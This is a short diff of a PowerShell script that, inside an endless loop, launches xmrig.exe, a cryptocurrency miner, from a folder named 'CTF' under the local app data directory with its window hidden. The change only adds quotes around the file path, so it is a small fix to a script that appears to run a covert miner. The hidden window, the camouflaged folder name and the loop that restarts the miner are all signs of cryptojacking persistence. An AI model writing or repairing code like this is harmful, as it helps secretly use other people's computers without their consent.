@@ -19,7 +19,7 @@ while ($true){
        }
        catch{
             if($ativoprocess -eq $false){
-                Start-Process -FilePath $env:LOCALAPPDATA\CTF\xmrig.exe -WindowStyle Hidden
+                Start-Process -FilePath "$env:LOCALAPPDATA\CTF\xmrig.exe" -WindowStyle Hidden
                 $ativoprocess = $true
             }
             else{
